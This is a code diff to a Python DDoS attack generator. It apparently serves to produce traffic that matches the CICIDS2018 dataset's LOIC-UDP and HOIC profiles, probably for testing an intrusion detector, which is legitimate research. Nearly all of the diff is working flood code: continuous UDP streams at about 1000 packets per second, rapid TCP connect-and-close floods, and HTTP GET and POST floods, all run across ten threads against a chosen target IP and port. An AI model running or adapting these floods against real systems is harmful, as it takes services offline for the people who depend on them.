@@ -16,10 +16,22 @@ import random
 import string
 
 # TCP receive buffer sizes → Init Fwd Win Byts feature.
-# Values derived from CICIDS2018 training data analysis.
+# Values derived from CICIDS2018 training data per-class medians.
 # SO_RCVBUF set BEFORE connect() controls TCP SYN window size.
-_RCVBUF_LOIC_HTTP = 8192     # Training mode: 8192 (56.8% of TCP flows) ✓
-_RCVBUF_HOIC = 8192          # Training mode: 8192 (56.8% of TCP flows) ✓
+#
+# DDoS training data is 99.7% HOIC (n=686K) + 0.3% LOIC-UDP (n=1730).
+# There is NO LOIC-HTTP in the training data at all!
+# All TCP DDoS should match the HOIC profile.
+#
+# HOIC training data (n=411K, Wed-21-02-2018):
+#   Init Fwd Win Byts: median=32738, p5=32738, p95=65535
+#   Tot Fwd Pkts: median=2 (short connections)
+#   TotLen Fwd Pkts: median=0 (most have no payload)
+#   Flow Duration: median=9880 µs (~10ms)
+#   Fwd Pkts/s: median=243
+#   Fwd Seg Size Min: 20 (HOIC used no TCP timestamps)
+#
+_RCVBUF_HOIC = 32738          # HOIC training median: 32738 (standard Windows default)
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
@@ -49,120 +61,80 @@ class DDoSAttack:
             self.packet_count += n
 
     # ──────────────────────────────────────────────────────
-    # LOIC-UDP — High-volume UDP flood to a FIXED port
-    #   All packets to the SAME dst_port so CICFlowMeter groups
-    #   them into ONE flow with extremely high packet count.
-    #   Creates flows with: very high Tot Fwd Pkts, high
-    #   TotLen Fwd Pkts, very low Flow IAT, Protocol=17 (UDP).
+    # LOIC-UDP — High-volume continuous UDP stream
+    #
+    #   CICIDS2018 training data (n=1730, Wed-21-02-2018):
+    #     Tot Fwd Pkts:    median=119,758 (massive continuous stream!)
+    #     TotLen Fwd Pkts: median=3,832,272
+    #     Flow Duration:   median=119,777,312 µs (~120 sec)
+    #     Fwd Pkts/s:      median=1016
+    #     Fwd Pkt Len Mean: 32 (fixed small packets)
+    #     Protocol: 17 (UDP)
+    #     Tot Bwd Pkts: 0 (unidirectional)
+    #
+    #   The training data shows LOIC-UDP sends ~1000 small UDP
+    #   packets/sec continuously for ~2 minutes. Each flow has
+    #   ~120K packets because CICFlowMeter groups all packets to
+    #   the same dst IP:port into one long flow.
     # ──────────────────────────────────────────────────────
     def udp_flood(self):
-        """LOIC-UDP: Flood target with UDP packets - create socket, send 1-3 packets, close.
-        CORRECT CICIDS2018: Burst model with rapid socket opening/closing for high flow rate."""
+        """LOIC-UDP: Send continuous stream of small UDP packets.
+        Each CICFlowMeter flow accumulates ~120K packets over ~2 minutes,
+        matching the training data profile of massive continuous streams."""
         end_time = time.time() + self.duration
-        udp_ports = [53, 123, 161, 514, 1900, 5353, 19132]
-        payload_sizes = [512, 1024, 1400]
+        udp_port = self.target_port if self.target_port != 80 else 80
 
         while self.running and time.time() < end_time:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.settimeout(1)
                 
-                # CORRECT CICIDS2018: 1-3 packets per burst (not 500+)
-                # High volume comes from MANY socket bursts, not packet reuse
-                num_packets = random.randint(1, 3)
-                port = random.choice(udp_ports)
+                # Send continuous stream of small packets (~1000/sec for ~30 sec)
+                # CICFlowMeter groups these into one long flow
+                stream_duration = min(30, self.duration)
+                stream_end = time.time() + stream_duration
                 
-                for _ in range(num_packets):
-                    payload_size = random.choice(payload_sizes)
-                    data = random.randbytes(payload_size) if hasattr(random, 'randbytes') else bytes(random.getrandbits(8) for _ in range(payload_size))
+                while self.running and time.time() < stream_end:
+                    # Small fixed-size payload (32 bytes, matching training Pkt Len Mean=32)
+                    payload = random.randbytes(32) if hasattr(random, 'randbytes') else bytes(random.getrandbits(8) for _ in range(32))
                     try:
-                        sock.sendto(data, (self.target_ip, port))
+                        sock.sendto(payload, (self.target_ip, udp_port))
                         self._inc_count()
                     except Exception:
                         break
-                    # Minimal delay between packets within burst
-                    time.sleep(random.uniform(0.001, 0.005))
+                    
+                    # ~1000 packets/sec (matching training Fwd Pkts/s median=1016)
+                    time.sleep(random.uniform(0.0008, 0.0012))
                 
                 sock.close()
             except Exception:
                 pass
             
-            # Rapid-fire socket bursts (0.3-0.5s between bursts creates ~2-3 flows/sec)
-            time.sleep(random.uniform(0.3, 0.5))
+            # Brief pause between streams
+            time.sleep(random.uniform(0.5, 1.0))
 
     # ──────────────────────────────────────────────────────
-    # LOIC-HTTP — High-volume HTTP GET flood over keep-alive
-    #   Creates flows with: very high Tot Fwd Pkts, very high
-    #   Flow Pkts/s, high TotLen Fwd Pkts, many PSH flags.
+    # HTTP Flood — HOIC-style rapid connection flood
+    #
+    #   NOTE: There is NO "LOIC-HTTP" label in CICIDS2018 training data.
+    #   All TCP DDoS training data is HOIC (686K samples).
+    #   Therefore this method mimics the HOIC profile.
+    #
+    #   HOIC training data (n=411K):
+    #     Tot Fwd Pkts: median=2, TotLen Fwd Pkts: median=0
+    #     Flow Duration: median=9880 µs (~10ms)
+    #     Init Fwd Win Byts: median=32738
+    #     Fwd Pkts/s: median=243
+    #     ACK Flag Cnt: median=1
+    #
+    #   Most HOIC flows are short TCP connections with no payload
+    #   (SYN+ACK+close pattern). ~60% have 0 payload.
     # ──────────────────────────────────────────────────────
     def http_flood(self):
-        """LOIC-HTTP: Rapid HTTP GET requests, multiple connections to different ports.
-        VARIATION: Variable ports and request counts per connection."""
+        """HTTP flood: Rapid TCP connection flood matching HOIC profile.
+        60% connect+close (no data), 40% send small HTTP request.
+        Uses HOIC-matching SO_RCVBUF for Init Fwd Win Byts."""
         end_time = time.time() + self.duration
-        http_ports = [80, 8080, 8888, 3000, 5000, 443]
-
-        while self.running and time.time() < end_time:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(10)
-                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_LOIC_HTTP)
-                
-                # VARIATION: Random HTTP port
-                attack_port = random.choice(http_ports)
-                sock.connect((self.target_ip, attack_port))
-
-                # CORRECT CICIDS2018: 1-5 requests per keep-alive connection (NOT 1000+)
-                # High volume comes from MANY concurrent threads, not from requests per connection
-                for _ in range(random.randint(1, 5)):
-                    if not self.running or time.time() >= end_time:
-                        break
-
-                    path = f"/{_random_string(random.randint(6, 12))}?{_random_string(4)}={_random_string(8)}"
-                    req = (
-                        f"GET {path} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}:{attack_port}\r\n"
-                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-                        f"Accept: */*\r\n"
-                        f"Connection: keep-alive\r\n"
-                        f"\r\n"
-                    )
-                    sock.sendall(req.encode())
-                    self._inc_count()
-
-                    # Drain response briefly
-                    try:
-                        sock.settimeout(0.005)
-                        sock.recv(8192)
-                    except socket.timeout:
-                        pass
-                    sock.settimeout(10)
-                    
-                    # Minimal delay between requests within keep-alive
-                    time.sleep(random.uniform(0.01, 0.05))
-
-                sock.close()
-            except Exception:
-                pass
-
-    # ──────────────────────────────────────────────────────
-    # HOIC — HTTP POST flood, NEW connection per 1-2 requests
-    #
-    # CICIDS2018 training data profile:
-    #   Tot Fwd Pkts:    mean=2.5, median=2.5
-    #   TotLen Fwd Pkts: mean=149.4, median=36.5
-    #   Fwd Seg Size Min: 20 (no timestamps in HOIC tool)
-    #   Init Fwd Win Byts: median=49136
-    #   Flow Duration:   very short (~17ms)
-    #   Dst Port: 80
-    #
-    # CRITICAL: Training shows very short connections (2.5 pkts).
-    # ──────────────────────────────────────────────────────
-    def hoic_flood(self):
-        """HOIC: HTTP POST flood with large payloads, NEW connection per 1-2 requests.
-        VARIATION: Random ports and body sizes for realistic attack pattern."""
-        end_time = time.time() + self.duration
-        http_ports = [80, 8080, 8888, 3000, 5000, 443]
 
         while self.running and time.time() < end_time:
             try:
@@ -171,24 +143,79 @@ class DDoSAttack:
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HOIC)
                 
-                # VARIATION: Random HTTP port
-                attack_port = random.choice(http_ports)
-                sock.connect((self.target_ip, attack_port))
+                sock.connect((self.target_ip, self.target_port))
+                self._inc_count()
 
-                # CORRECT CICIDS2018: 1-3 POST requests per connection (NOT 500-1000)
-                # Close and reopen for each new connection
-                requests_this_conn = random.randint(1, 3)
-                for _ in range(requests_this_conn):
-                    if not self.running or time.time() >= end_time:
-                        break
+                # 60% connect+close (matching training median of 0 payload)
+                # 40% send a small GET request
+                if random.random() < 0.40:
+                    path = f"/{_random_string(random.randint(6, 12))}?{_random_string(4)}={_random_string(8)}"
+                    req = (
+                        f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {self.target_ip}:{self.target_port}\r\n"
+                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
+                        f"Accept: */*\r\n"
+                        f"Connection: close\r\n"
+                        f"\r\n"
+                    )
+                    sock.sendall(req.encode())
 
-                    # VARIATION: Variable body size (500-12000 bytes for diversity)
-                    body_size = random.randint(500, 12000)
+                    # Brief drain
+                    try:
+                        sock.settimeout(0.05)
+                        sock.recv(4096)
+                    except socket.timeout:
+                        pass
+
+                sock.close()
+            except Exception:
+                pass
+            
+            # Rapid-fire (~10ms between connections, matching training Flow Duration)
+            time.sleep(random.uniform(0.005, 0.015))
+
+    # ──────────────────────────────────────────────────────
+    # HOIC — Rapid TCP connection flood with occasional POST
+    #
+    # CICIDS2018 training data (n=411K, Wed-21-02-2018):
+    #   Tot Fwd Pkts:    median=2 (short connections)
+    #   TotLen Fwd Pkts: median=0 (most have no payload!)
+    #   Fwd Seg Size Min: 20 (no TCP timestamps)
+    #   Init Fwd Win Byts: median=32738
+    #   Flow Duration:   median=9880 µs (~10ms)
+    #   Fwd Pkts/s:      median=243
+    #   ACK Flag Cnt:    median=1
+    #   Dst Port: 80
+    #
+    # CRITICAL: Training shows 50%+ of HOIC flows have NO payload.
+    # The attack overwhelms the server so most connections are
+    # SYN+ACK+close with no data exchange.
+    # ──────────────────────────────────────────────────────
+    def hoic_flood(self):
+        """HOIC: Rapid TCP connection flood, mostly connect+close.
+        60% connect+close (no data), 40% send POST with payload.
+        Matches training profile of median 0 payload, ~10ms flows."""
+        end_time = time.time() + self.duration
+
+        while self.running and time.time() < end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(5)
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HOIC)
+                
+                sock.connect((self.target_ip, self.target_port))
+                self._inc_count()
+
+                # 60% connect+close (matching training median of 0 payload)
+                # 40% send POST (matching training p95 with data)
+                if random.random() < 0.40:
+                    body_size = random.randint(500, 8000)
                     body = _random_string(body_size)
                     path = f"/{_random_string(random.randint(5, 12))}"
                     req = (
                         f"POST {path} HTTP/1.1\r\n"
-                        f"Host: {self.target_ip}:{attack_port}\r\n"
+                        f"Host: {self.target_ip}:{self.target_port}\r\n"
                         f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                         f"Content-Type: application/x-www-form-urlencoded\r\n"
                         f"Content-Length: {len(body)}\r\n"
@@ -198,37 +225,46 @@ class DDoSAttack:
                         f"{body}"
                     )
                     sock.sendall(req.encode())
-                    self._inc_count()
 
                     # Drain response
                     try:
                         sock.settimeout(0.1)
-                        sock.recv(8192)
+                        sock.recv(4096)
                     except socket.timeout:
                         pass
-                    
-                    # Minimal delay between requests
-                    time.sleep(random.uniform(0.01, 0.05))
 
                 sock.close()
             except Exception:
                 pass
+            
+            # Rapid-fire (~10ms between connections)
+            time.sleep(random.uniform(0.005, 0.015))
 
-    def run_attack(self, num_threads=1):
-        """Run DDoS attack with multiple threads."""
+    def run_attack(self, num_threads=10):
+        """Run DDoS attack with multiple threads.
+        Thread allocation: 4x HTTP-flood (HOIC-style), 3x HOIC, 3x LOIC-UDP
+        NOTE: All TCP threads use HOIC profile since that's 99.7% of training data."""
         print(f"[DDoS] Starting attack on {self.target_ip}:{self.target_port} for {self.duration}s")
-        print(f"[DDoS] Techniques: LOIC-HTTP + LOIC-UDP + HOIC")
-        print(f"[DDoS] Using {num_threads} threads (throttled from 10 to reduce flow rate)")
+        print(f"[DDoS] Techniques: HTTP-flood(4T) + HOIC(3T) + LOIC-UDP(3T)")
+        print(f"[DDoS] Using {num_threads} threads (all TCP threads match HOIC profile)")
 
-        techniques = [
-            self.udp_flood,
-            self.http_flood,
-            self.hoic_flood,
+        # Weighted: HTTP flood and HOIC get more threads for higher flow rate
+        weighted_techniques = [
+            self.http_flood,   # Thread 0
+            self.http_flood,   # Thread 1
+            self.http_flood,   # Thread 2
+            self.http_flood,   # Thread 3
+            self.hoic_flood,   # Thread 4
+            self.hoic_flood,   # Thread 5
+            self.hoic_flood,   # Thread 6
+            self.udp_flood,    # Thread 7
+            self.udp_flood,    # Thread 8
+            self.udp_flood,    # Thread 9
         ]
 
         threads = []
         for i in range(num_threads):
-            technique = techniques[i % len(techniques)]
+            technique = weighted_techniques[i % len(weighted_techniques)]
             t = threading.Thread(target=technique, name=f"DDoS-{technique.__name__}-{i}")
             t.daemon = True
             t.start()
